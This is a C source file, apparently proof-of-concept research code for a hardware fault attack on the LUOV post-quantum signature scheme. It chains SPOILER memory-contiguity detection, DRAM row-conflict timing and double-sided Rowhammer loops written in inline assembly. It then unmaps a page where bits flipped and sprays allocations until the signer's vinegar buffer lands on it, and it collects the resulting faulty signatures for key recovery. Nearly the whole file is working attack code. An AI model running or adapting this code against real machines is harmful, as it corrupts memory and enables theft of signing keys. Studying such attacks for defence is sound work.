#include <stdio.h>
#include <stdint.h>			// uint64_t
#include <stdlib.h>			// For malloc
#include <string.h>			// For memset
#include <time.h>
#include <fcntl.h>			// For O_RDONLY in get_physical_addr fn 
#include <unistd.h>			// For pread in get_physical_addr fn, for usleep
#include <sys/mman.h>
#include <stdbool.h>		// For bool

#define ROUNDS 100
#define ROUNDS2 10000
#define PAGE_COUNT 256 * (uint64_t)256	// ARG2 is the buffer size in MB
#define PAGE_SIZE 4096
#define PEAKS PAGE_COUNT/256*2

// Measure_read
#define measure(_memory, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "rdtscp;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%eax;"\
   "rdtscp;"\
   "mfence;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)

// Row_conflict
#define clfmeasure(_memory, _memory2, _time)\
do{\
   register uint32_t _delta;\
   asm volatile(\
   "mov %%rdx, %%r11;"\
   "clflush (%%r11);"\
   "clflush (%%rbx);"\
   "mfence;"\
   "rdtsc;"\
   "mov %%eax, %%esi;"\
   "mov (%%rbx), %%ebx;"\
   "mov (%%r11), %%edx;"\
   "rdtscp;"\
   "sub %%esi, %%eax;"\
   "mov %%eax, %%ecx;"\
   : "=c" (_delta)\
   : "b" (_memory), "d" (_memory2)\
   : "esi", "r11"\
   );\
   *(uint32_t*)(_time) = _delta;\
}while(0)

// Row_hammer for 1->0 flips
#define hammer10(_memory, _memory2)\
do{\
   asm volatile(\
   "mov $1000000, %%r11;"\
   "h10:"\
   "clflush (%%rdx);"\
   "clflush (%%rbx);"\
   "mfence;"\
   "mov (%%rbx), %%r12;"\
   "mov (%%rdx), %%r13;"\
   "dec %%r11;"\
   "jnz h10;"\
   : \
   : "b" (_memory), "d" (_memory2)\
   : "r11", "r12", "r13"\
   );\
}while(0)

// Row_hammer for 0-1> flips
#define hammer01(_memory, _memory2)\
do{\
   asm volatile(\
   "mov $1000000, %%r11;"\
   "h01:"\
   "clflush (%%rdx);"\
   "clflush (%%rbx);"\
   "mfence;"\
   "mov (%%rbx), %%r12;"\
   "mov (%%rdx), %%r13;"\
   "dec %%r11;"\
   "jnz h01;"\
   : \
   : "b" (_memory), "d" (_memory2)\
   : "r11", "r12", "r13"\
   );\
}while(0)

// get_physical_addr function from https://github.com/IAIK/flipfloyd
static uint64_t get_physical_addr(uint64_t virtual_addr)
{
	static int g_pagemap_fd = -1;
	uint64_t value;

	// open the pagemap
	if(g_pagemap_fd == -1) {
	  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
	}
	if(g_pagemap_fd == -1) return 0;

	// read physical address
	off_t offset = (virtual_addr / 4096) * sizeof(value);
	int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
	if(got != 8) return 0;

	// Check the "page present" flag.
	if(!(value & (1ULL << 63))) return 0;

	// return physical address
	uint64_t frame_num = value & ((1ULL << 55) - 1);
	return (frame_num * 4096) | (virtual_addr & (4095));
}

#include "parameters.h"

#include "F256Field.h"

#include "LUOV.h"

#include "api.h"

#define NUMBER_OF_KEYPAIRS 1		/* Number of keypairs that is generated during test */
#define SIGNATURES_PER_KEYPAIR 1	/* Number of times each keypair is used to sign a random document, and verify the signature */
#define VERIFICATIONS_PER_SIGNATURE 1

void* aligned_alloc(size_t, size_t);

/*
	Tests the execution of the keypair generation, signature generation and signature verification algorithms and prints timing results
*/

int main(void)
{	
	int peaks[PEAKS] = {0};
	int peak_index = 0;
	int apart[PEAKS] = {0};
	uint32_t t1 = 0;
	uint32_t t2 = 0;
	uint32_t tt = 0;
	uint64_t total = 0;
	int t2_prev;
	clock_t cl;
	clock_t cl2;
	float pre_time = 0.0;
	float online_time = 0.0;
	
	// Allocating memories
	uint8_t * evictionBuffer;
	evictionBuffer = mmap(NULL, PAGE_COUNT * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	uint16_t * measurementBuffer;
	measurementBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));
	uint16_t * conflictBuffer;
	conflictBuffer = (uint16_t*) malloc(PAGE_COUNT * sizeof(uint16_t));

	////////////////////////////////SPOILER////////////////////////////////////
	// Warmup loop to avoid initial spike in timings
	for (int i = 0; i < 100000000; i++); 
	
	#define WINDOW 64
	#define THRESH_OUTLIER 1000	// Adjust after looking at outliers in t2.txt
								// Uncomment writing t2.txt part
	#define THRESH_LOW 300		// Adjust after looking at diff(t2.txt)
	#define THRESH_HI 500		// Adjust after looking at diff(t2.txt)
	
	int cont_start = 0;			// Starting and ending page # for cont_mem
	int cont_end = 0;
	
	t2_prev = 0;
	cl = clock();
	for (int p = WINDOW; p < PAGE_COUNT; p++)
	{
		total = 0;
		int cc = 0;

		for (int r = 0; r < ROUNDS; r++)		
		{
			for(int i = WINDOW; i >= 0; i--)
			{
				evictionBuffer[(p-i)*PAGE_SIZE] = 0;
			}

			measure(evictionBuffer, &tt);
			if (tt < THRESH_OUTLIER)
			{
				total = total + tt;
				cc++;
			}
		}
		if (cc != 0) {
			measurementBuffer[p] = total / cc;
		}
		// Extracting the peaks
		if (total/ROUNDS-t2_prev > THRESH_LOW && total/ROUNDS-t2_prev < THRESH_HI)
		{
			peaks[peak_index] = p;
			peak_index++;
		}
		t2_prev = total / ROUNDS;
	}

	// Writing the timings into the file
	/*
	FILE *t2_file;
	t2_file = fopen("t2.txt", "w");
	for(int p = 0; p < PAGE_COUNT; p++)
		fprintf(t2_file, "%u\n", measurementBuffer[p]);
	fclose(t2_file);
	*/
	free(measurementBuffer);

	// Finding distances between the peaks in terms of # of pages
	for (int j = 0; j < peak_index - 1; j++)
	{
		apart[j] = peaks[j+1] - peaks[j];
	}

	// Here 1 unit means 256 pages = 1MB
	// 8 means we are looking for 9 peaks 256 apart = 8MB
	int cont_window = 8;
	int condition;
	for (int j = 0; j < peak_index - 1 - cont_window; j++)
	{
		condition = 1;
		for (int q = 0; q < cont_window; q++)
		{
			condition = condition && (apart[j+q] == 256);
		}
		
		if (condition)
		{
			printf("\n******************%d MB CONTIGUOUS MEMORY DETECTED BY SPOILER******************\n", cont_window);
			cont_start = peaks[j];
			cont_end = peaks[j + cont_window];
			break;
		}
	}
	if (cont_start == 0)
	{
		printf("\nUnable to detect required contiguous memory of %dMB within %luMB buffer\n\n", cont_window, PAGE_COUNT*PAGE_SIZE/1024/1024);
		exit(0);
	}
	///////////////////////////////////////////////////////////////////////////
	



	
	////////////////////////////////ROW_CONFLICT///////////////////////////////
	//Running row_conflict on the detected contiguous memory to find addresses
	// going into the same bank
	// Adjust after looking at c.txt. Uncomment writing c.txt part
	#define THRESH_ROW_CONFLICT 380
	int conflict[PEAKS] = {0};
	int conflict_index = 0;
	for (int p = cont_start; p < cont_end; p++)
	{
		total = 0;
		int cc = 0;
		for (int r = 0; r < ROUNDS2; r++)
		{			
			clfmeasure(&evictionBuffer[cont_start*PAGE_SIZE], &evictionBuffer[p*PAGE_SIZE], &tt);
			if (tt < THRESH_OUTLIER-500)
			{
				total = total + tt;
				cc++;
			}
		}
		conflictBuffer[p-cont_start] = total / cc;
		if (total/cc > THRESH_ROW_CONFLICT)
		{
			conflict[conflict_index] = p;
			conflict_index++;
		}
	}
	cl = clock() - cl;
	pre_time = ((float) cl)/CLOCKS_PER_SEC;
	
	// Writing rowconflicts into the file
	/*
	FILE *c_file;
	c_file = fopen("c.txt", "w");
	for(int p = 0; p < cont_end - cont_start; p++)
		fprintf(c_file, "%u\n", conflictBuffer[p]);
	fclose(c_file);
	*/
	
    free(conflictBuffer);

	printf("\nTotal rows for hammering %i\n\n", conflict_index/2);
	
	///////////////////////////////////////////////////////////////////////////
	
	
	//cl = clock();
	///////////////////////////////DOUBLE_SIDED_ROWHAMMER//////////////////////
	#define MARGIN 0	// Margin is used to skip initial rows to get flips earlier
						// Reason: In the start, memory is not very contiguous
	int h;
	bool flip_found10 = false;
	bool flip_found01 = false;
	bool repeated = false;
	int flippy_addr_count01 = 0;
	int flips_per_row10 = 0;
	int flips_per_row01 = 0;
	int total_flips_10 = 0;
	int total_flips_01 = 0;
	uint64_t flippy_virt_addr10 = 0;
	uint64_t flippy_virt_addr01 = 0;
	uint64_t flippy_phys_addr10 = 0;
	uint64_t flippy_phys_addr01 = 0;
	int flippy_offsets10[8*1024] = {0};
	int flippy_offsets01[8*1024] = {0};
	uint64_t flippy_list[30000] = {0};
	
	for (h = MARGIN; h < conflict_index - 2; h=h+2)
	{
		repeated = false;
		flip_found10 = false;
		flip_found01 = false;
		cl = clock();
		// For 1->0 FLIPS
		printf("Hammering Rows %i %i %i\n", h/2, h/2+1, h/2+2);
		
		// Filling the Victim and Neighboring Rows with Own Data
		for (int y = 0; y < 8*1024; y++)
		{
			evictionBuffer[(conflict[h]*PAGE_SIZE)+y] = 0x00;	// Top Row
			evictionBuffer[(conflict[h+2]*PAGE_SIZE)+y] = 0xFF;	// Victim Row
			evictionBuffer[(conflict[h+4]*PAGE_SIZE)+y] = 0x00;	// Bottom Row
		}

		// Hammering Neighboring Rows
		hammer10(&evictionBuffer[conflict[h]*PAGE_SIZE], &evictionBuffer[conflict[h+4]*PAGE_SIZE]);

		// Checking for Bit Flips
		flips_per_row10 = 0;
		for (int y = 0; y < 8*1024; y++)
		{
			if (evictionBuffer[(conflict[h+2]*PAGE_SIZE)+y] != 0xFF)
			{
				flip_found10 = true;
				printf("%lx 1->0 FLIP at row offset = %d\n", get_physical_addr((uint64_t)&evictionBuffer[(conflict[h+2]*PAGE_SIZE)]), y);
				flippy_offsets10[flips_per_row10] = y;
				flips_per_row10++;
			}
		}
		
		
		// For 0->1 FLIPS
		// Filling the Victim and Neighboring Rows with Own Data
		for (int y = 0; y < 8*1024; y++)
		{
			evictionBuffer[(conflict[h]*PAGE_SIZE)+y] = 0xFF;	// Top Row
			evictionBuffer[(conflict[h+2]*PAGE_SIZE)+y] = 0x00;	// Victim Row
			evictionBuffer[(conflict[h+4]*PAGE_SIZE)+y] = 0xFF;	// Bottom Row
			//printf("%02x", evictionBuffer[(conflict[2]*PAGE_SIZE)+y]);
		}

		// Hammering Neighboring Rows
		hammer01(&evictionBuffer[conflict[h]*PAGE_SIZE], &evictionBuffer[conflict[h+4]*PAGE_SIZE]);

		// Checking for Bit Flips
		flips_per_row01 = 0;
		for (int y = 0; y < 8*1024; y++)
		{
			if (evictionBuffer[(conflict[h+2]*PAGE_SIZE)+y] != 0x00)
			{
				flip_found01 = true;
				printf("%lx 0->1 FLIP at row offset = %d\n", get_physical_addr((uint64_t)&evictionBuffer[(conflict[h+2]*PAGE_SIZE)]), y);
				flippy_offsets01[flips_per_row01] = y;
				flips_per_row01++;
			}
		}
		
		if (flip_found10 == true || flip_found01 == true) {
			flippy_virt_addr10 = (uint64_t)&evictionBuffer[(conflict[h+2]*PAGE_SIZE)];
			flippy_phys_addr10 = get_physical_addr((uint64_t)&evictionBuffer[(conflict[h+2]*PAGE_SIZE)]);
			total_flips_10 = total_flips_10 + flips_per_row10;
			total_flips_01 = total_flips_01 + flips_per_row01;
	
			// Unmapping flippy addresses
			//It should be before writing to file so that the victim doesn't
			// try to get on that address before its freed by the attacker
			printf("\nUnmapped physical: ");
			printf("%lx\n", flippy_phys_addr10);
			
			// Checking for repeated flippy addresses, removing duplicates
			FILE *unmapped_file;
			unmapped_file = fopen("unmapped.txt", "r");
			int q = 0;
			while (fscanf(unmapped_file, "%lx", &flippy_list[q]) != EOF){
				q++;
			}
			fclose(unmapped_file);
	
			for (int r=0; r<q; r++) {
				if (flippy_list[r] == flippy_phys_addr10) {
					repeated = true;
				}
			}
			
			if (repeated == true) {
				printf("\n\nFLIPPY ADDRESS REPEATED, NOT PASSING TO ONLINE PHASE %lx\n\n", flippy_phys_addr10);
				continue;
			}
			else {
				unmapped_file = fopen("unmapped.txt", "a");
				fprintf(unmapped_file, "%lx\n", flippy_phys_addr10);
				fclose(unmapped_file);
			}
			
			munmap((void*)flippy_virt_addr10, 8192);
			
			cl = clock() - cl;
			pre_time = pre_time + ((float) cl)/CLOCKS_PER_SEC;
			
			int i, j, k;
			int message_size = 50;
			unsigned long long smlen;
			unsigned long long mlen;
			unsigned char m[message_size];
			unsigned char m2[message_size];
			unsigned char *pk = aligned_alloc(32,sizeof(unsigned char[CRYPTO_PUBLICKEYBYTES]));
			unsigned char *sk = aligned_alloc(32,sizeof(unsigned char[CRYPTO_SECRETKEYBYTES]));
			unsigned char *sm = aligned_alloc(32,sizeof(unsigned char[message_size + CRYPTO_BYTES]));

			int chacha_startup(void);

			// Print key and signature sizes
			// printf("Public Key takes %d B\n", CRYPTO_PUBLICKEYBYTES );
			// printf("Secret Key takes %d B\n", CRYPTO_SECRETKEYBYTES );
			// printf("Signature takes %d B\n\n", CRYPTO_BYTES );

			srand((unsigned int) time(NULL));

			uint64_t genTime = 0;
			uint64_t signTime = 0;
			uint64_t verifyTime = 0;

			uint64_t * T;
			uint64_t phys_addr;
			bool fscanfok;
			bool flag = false;

			uint64_t flippy_phys_addr_next;
			flippy_phys_addr_next = flippy_phys_addr10;
	
			// Allocating memory for T until it gets on the flippy physical address
			int PAGE_COUNT2 = sysconf(_SC_AVPHYS_PAGES);

			cl2 = clock();
			
			for (int i = 0; i < PAGE_COUNT2; i++) {
				T = mmap(NULL, VINEGAR_VARS+1, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

				phys_addr = get_physical_addr((uint64_t)T);
	
				if (phys_addr == flippy_phys_addr10 || phys_addr == flippy_phys_addr10+0x1000) {
					printf("\nI am in the flippy row now at physical address %lx ", phys_addr);
					flag = true;	
					break;
				}
			}
			if (flag == false)
			{
				printf("\nCouldn't place myself in the flippy DRAM row, try again\n");
				return 0;
			}

			for (i = 0; i < NUMBER_OF_KEYPAIRS ; i++) {

				// time key pair generation
				// cl = rdtsc();
				crypto_sign_keypair(pk, sk);
				// genTime += rdtsc() - cl;

				//for (j = 0; j < SIGNATURES_PER_KEYPAIR ; j++) {
			
					// pick a random message to sign
					// for (k = 0; k < message_size; k++) {
					//		m[k] = ((unsigned char) rand());
					// }
			
					// Replaced with the above to get same random messages each time
					randombytes(m, message_size);		
			
					// time signing algorithm
					// cl = rdtsc();
			
					///////////////////////////////////////////////////////////////////
					crypto_sign(sm, &smlen, m, (unsigned long long) message_size, sk, T, h, evictionBuffer, conflict);
					///////////////////////////////////////////////////////////////////
					//signTime += rdtsc() - cl;
					//printf("signed message length is %lld B\n", smlen);
			
					// time verification algorithm
					int verifs;
					// cl = rdtsc();
					for(verifs = 0 ; verifs < VERIFICATIONS_PER_SIGNATURE ; verifs++){
						if (crypto_sign_open(m2, &mlen, sm, smlen, pk) != 0) {
							printf("Verification of signature Failed!\n");
							
							// Saving faulty signatures in a file
							FILE *faulty_sig;
							faulty_sig = fopen("faulty_signatures.txt", "a");
							//fprintf(faulty_sig, "\nReturned Signature (m, s, salt) %llu B = %d + %llu + %d\n", smlen, message_size, smlen-message_size-SALT_BYTES, SALT_BYTES);
							for (int pp = 0; pp < smlen; pp++) {
								fprintf(faulty_sig, "%02x", sm[pp]);
							}
							fprintf(faulty_sig, "\n");
							fclose(faulty_sig);
						}
					}
					// uint64_t a = rdtsc() - cl;
					// verifyTime += a;
			
					/*
					// check if recovered message length is correct
					if (mlen != message_size){
						printf("Wrong message size !\n");
					}

					// check if recovered message is correct
					for(k = 0 ; k<message_size ; k++){
						if(m[k]!=m2[k]){
							printf("Wrong message !\n");
							break;
						}
					}
					*/
			}

			cl2 = clock() - cl2;
			online_time = online_time + ((float) cl2)/CLOCKS_PER_SEC;
			
			//printf("Key pair generation took %llu cycles.\n",(long long unsigned) genTime / NUMBER_OF_KEYPAIRS);
			//printf("Signing took %llu cycles.\n", (long long unsigned) (signTime/NUMBER_OF_KEYPAIRS)/SIGNATURES_PER_KEYPAIR );
			//printf("Verifying took %llu cycles.\n\n", (long long unsigned) (verifyTime / NUMBER_OF_KEYPAIRS) / SIGNATURES_PER_KEYPAIR / VERIFICATIONS_PER_SIGNATURE );

			free(pk);
			free(sk);
			free(sm);
			h=h+2;
		}
	}
	
	FILE *pre_file;
	pre_file = fopen("pre.txt", "a");
	fprintf(pre_file, "%.2f\n", pre_time);
	fclose(pre_file);
	
	FILE *online_file;
	online_file = fopen("online.txt", "a");
	fprintf(online_file, "%.2f\n", online_time);
	fclose(online_file);
	
	return 0;
}
